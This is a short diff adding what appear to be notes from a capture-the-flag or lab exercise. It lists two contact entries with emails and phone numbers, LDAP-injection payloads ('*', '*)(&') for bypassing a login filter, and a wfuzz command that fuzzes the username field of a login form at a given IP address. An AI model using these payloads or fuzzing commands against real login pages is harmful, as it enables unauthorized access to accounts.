@@ -1,0 +1,12 @@
+Eimile Pantlin	epantlin1c@admin.ch	690-650-9785
+
+Kyle Reese	reese@skynet.com	555-1234567
+
+Payload :
+
+*
+*)(&
+
+wfuzz :
+
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/medium.txt --hs "not found" -d "username=FUZZ&password=nul" -u http://138.68.182.108:30571/login
